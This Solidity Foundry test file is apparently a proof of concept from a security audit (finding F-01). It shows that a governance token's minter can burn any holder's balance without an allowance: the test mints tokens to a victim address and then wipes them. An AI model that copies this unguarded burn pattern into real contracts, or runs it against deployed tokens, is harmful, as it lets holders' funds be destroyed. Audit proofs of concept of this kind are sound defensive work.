// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {GovernanceToken} from "../../src/governance/AdaptiveGovernance.sol";

/// @notice PoC：minter 无需 allowance 即可销毁任意账户余额（F-01）
/// @dev 断言方向为"证明缺陷存在"；修复后本测试应失败，改为 vm.expectRevert
contract POC_BurnWithoutAllowance is Test {
    GovernanceToken token;
    address victim = address(0xBEEF);

    function setUp() public {
        token = new GovernanceToken();
    }

    function test_MinterCanBurnAnyoneWithoutAllowance() public {
        token.mint(victim, 1_000e18);

        assertEq(token.balanceOf(victim), 1_000e18);
        assertEq(token.allowance(victim, address(this)), 0);

        token.burn(victim, 1_000e18);//无授权销毁

        console2.log("victim balance after burn:", token.balanceOf(victim));
        console2.log("totalSupply after burn   :", token.totalSupply());

        assertEq(token.balanceOf(victim), 0, "balance wiped without allowance");
    }
}
